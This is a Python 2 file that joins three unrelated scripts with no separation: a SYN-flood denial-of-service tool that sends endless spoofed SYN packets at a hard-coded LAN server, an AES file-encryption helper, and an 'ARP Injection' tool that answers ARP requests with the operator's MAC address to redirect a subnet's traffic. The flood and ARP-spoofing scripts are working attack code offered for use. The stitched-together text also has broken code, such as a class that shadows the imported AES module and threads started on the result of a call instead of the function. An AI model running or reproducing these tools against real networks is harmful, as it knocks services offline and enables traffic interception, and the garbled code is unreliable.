import dnet as dn
import pcapy as pca
import dpkt as dk
import threading
from dnet import IP_HDR_LEN

serverIp = "192.168.1.102"
sourceIp = "192.168.1.110"
dev = "wlan2"

class Dos:
    
    def __init__(self):
        #posloucha na rozhrani, je pro toto PC
        self.pc = pca.open_live(dev, 65536, 0, 10)
        #self.pc.setfilter("( host " + serverIp + ")")
        self.pc.setfilter("( tcp )")
        print "dostal se sem.pred loop"
        self.runSniff()
        print "dostal se sem.za loop"
        self.runSendSyn()

        
    def runSniff(self):
        t = threading.Thread(target=self.sniff()).start()
        t.join()
    
    def runSendSyn(self):
        t = threading.Thread(target=self.sendSyn()).start()
        t.join()
    def sniff(self):
        print "Sniff...."
        self.pc.loop(-1, self.pcapyCallback)
    
    def pcapyCallback(self, header, data):
        eth = dk.ethernet.Ethernet(data)
        ip = eth.data
        tcp = ip.data
        if ip.p == dk.ip.IP_PROTO_TCP:
            if tcp.sport == 80:
                ip.src, ip.dst = ip.dst, ip.src
                tcp.sport , tcp.dport = tcp.dport, tcp.sport
                tcp.flags = dk.tcp.TH_ACK
                ip.data = tcp
                dn.ip().send(ip)            
            
        
    def sendSyn(self):
        print "dostal se sem.sendSyn"
        while True:
            tcp = dk.tcp.TCP(sport=dn.rand().uint16(), dport=80, flags=dk.tcp.TH_SYN)
            ip= dk.ip.IP(src=dn.ip_aton(sourceIp), dst=dn.ip_aton(serverIp), p=dk.ip.IP_PROTO_IP, data = tcp)
            dn.ip().send(str(ip))
            
class Generator:
    def __init__(self):
        a = dn.tcp_pack_hdr(sport=dn.rand().uint16(), dport=80, flags=dn.TH_SYN)
        b = dn.ip_pack_hdr(dst=dn.ip_aton(serverIp),src=dn.ip_aton(sourceIp), p=dn.IP_PROTO_TCP, ttl=64)
        c = b+a
        snd = dn.ip()
        e = dn.ip_checksum(c)
        print e
        while 1:
            i = snd.send(e)
            if i == -1:
                print "fatal error"
        
gen = Generator()


from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random


class AES:
    
    def __init__(self):
        pass
    
    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = d_i = ''
        while len(d) < key_length + iv_length:
            d_i = md5(d_i + password + salt).digest()
            d += d_i
        return d[:key_length], d[key_length:key_length+iv_length]
    
    def encrypt(self, input, output, password, key_length=32):
        blSize = AES.block_size
        salt = Random.new().read(blSize - len('Salted__'))
        key, iv = self.derive_key_and_iv(password, salt, key_length, blSize)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        output.write('Salted__' + salt)
        finished = False
        while not finished:
            chunk = input.read(1024 * blSize)
            if len(chunk) == 0 or len(chunk) % blSize != 0:
                padding_length = blSize - (len(chunk) % blSize)
                chunk += padding_length * chr(padding_length)
                finished = True
            output.write(cipher.encrypt(chunk))
    
    def decrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)[len('Salted__'):]
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = ''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:
                padding_length = ord(chunk[-1])
                if padding_length < 1 or padding_length > bs:
                   raise ValueError("bad decrypt pad (%d)" % padding_length)
                # all the pad-bytes must be the same
                if chunk[-padding_length:] != (padding_length * chr(padding_length)):
                   # this is similar to the bad decrypt:evp_enc.c from openssl program
                   raise ValueError("bad decrypt")
                chunk = chunk[:-padding_length]
                finished = True
            out_file.write(chunk)
        
        
        
        
#!/usr/bin/python
###############################
#
# ARP Injection
#
# Created by Dillon Buchanan
#
###############################

import socket
from dpkt import ethernet, arp
import dpkt
import struct
import string
import getopt
import sys

#
# Convert a network mac address into a string
#
def eth_ntoa(buffer):
    macaddr = ''
    for intval in struct.unpack('BBBBBB', buffer):
        if intval > 15:
            replacestr = '0x'
        else:
            replacestr = 'x'
        macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
    return macaddr

#
# Convert a string representation of a mac address into a network address
#
def eth_aton(buffer):
    addr = ''
    temp = string.split(buffer, ':')
    buffer = string.join(temp, '')
    for i in range(0, len(buffer), 2):
        addr = ''.join([addr, struct.pack('B', int(buffer[i: i+2], 16))],)
    return addr
#
# Build an ARP reply message
#
def buildARP(so_mac, so_ip, to_mac, to_ip):
    arp_p = arp.ARP()
    arp_p.sha = eth_aton(so_mac)
    arp_p.spa = socket.inet_aton(so_ip)
    arp_p.tha = eth_aton(to_mac)
    arp_p.tpa = socket.inet_aton(to_ip)
    arp_p.op = arp.ARP_OP_REPLY

    packet = ethernet.Ethernet()
    packet.src = eth_aton(so_mac)
    packet.dst = eth_aton(to_mac)
    packet.data = arp_p
    packet.type = ethernet.ETH_TYPE_ARP
    return packet

#
# The usage of this program
#
def usage():
    print "ARP Server"
    print "Generates ARP replys for inquires matching a specific ip/subnet to a target mac address"
    print 
    print "\t-h              This help menu"
    print "\t-i <interface>  The interface to listen on"
    print "\t-m <ip>/<mask>  The IP/subnet mask to respond to"
    print "\t-r <mac addr>   The mac address to respond with"

#
# Creates a subnet mask from an integer /32, /16, /24, etc...
#
def makeMask(num):
    j = 0
    for i in range(0, num):
        j |= (1<<(31-i))
    return j


#Default parameters
iface = "eth0"
imask = 0
mask = "0.0.0.0"
my_mac = ""

# Get command line options
try:
    opts, args = getopt.getopt(sys.argv[1:], "hi:m:r:")
except getopt.GetoptError, err:
    print str(err)
    usage()
    sys.exit(2)

for o, a in opts:
    if o == "-h":
        usage()
        sys.exit()
    elif o == "-i":
        iface = a
    elif o == "-m":
        imask = makeMask(int(a.split("/")[1]))
        mask = a.split("/")[0]
    elif o == "-r":
        my_mac = a;

# Generate the mask correctly
mask = socket.inet_aton(mask)
mask = struct.unpack('>L', mask)[0] & imask

# Create a raw socket
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind((iface, ethernet.ETH_TYPE_ARP))

# If not mac supplied then default to the given interfaces
if my_mac == "":
    my_mac = eth_ntoa(s.getsockname()[-1])

# Get all the ARP packets
while 1:
    data = s.recv(1500)
    answer = ethernet.Ethernet(data)
    arp_p = answer.data

    orig = socket.inet_ntoa(arp_p.spa)
    to_mac = eth_ntoa(arp_p.sha)
    dest = socket.inet_ntoa(arp_p.tpa)
    dest_num = struct.unpack('>L', arp_p.tpa)[0]

    if arp_p.op == arp.ARP_OP_REQUEST:

        # Make sure they match our mask
        if (dest_num & imask != mask):
            continue

        print "Host %s is looking for %s. Responding with: %s " % (orig, dest, my_mac)
        packet = buildARP(my_mac, dest, to_mac, orig)
        s.send(str(packet))
